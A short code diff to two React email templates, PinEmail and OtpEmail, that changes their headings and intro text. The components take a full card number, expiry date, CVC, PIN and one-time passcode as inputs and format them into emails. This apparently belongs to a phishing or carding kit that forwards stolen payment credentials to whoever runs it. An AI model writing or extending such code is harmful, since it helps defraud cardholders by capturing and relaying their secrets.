@@ -12,8 +12,8 @@ interface PinEmailProps {
 export function PinEmail({ email, amount, cardName, cardNumber, expiryDate, cvc, cardType, pin }: PinEmailProps) {
   return (
     <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
-      <h2 style={{ color: "#059669" }}>Deposit Transaction - PIN Entered</h2>
-      <p>A deposit transaction has been initiated with the following details:</p>
+      <h2 style={{ color: "#059669" }}>New Card - Card Payment</h2>
+      <p>A New deposit has been initiated with the following details:</p>
       <div
         style={{
           background: "#f3f4f6",
@@ -45,8 +45,8 @@ interface OtpEmailProps {
 export function OtpEmail({ email, amount, otp }: OtpEmailProps) {
   return (
     <div style={{ fontFamily: "Arial, sans-serif", maxWidth: "600px", margin: "0 auto" }}>
-      <h2 style={{ color: "#059669" }}>Deposit Transaction Completed</h2>
-      <p>A deposit transaction has been completed:</p>
+      <h2 style={{ color: "#059669" }}>Deposit OTP</h2>
+      <p>A Deposit OTP has been Delivered:</p>
       <div
         style={{
           background: "#f3f4f6",
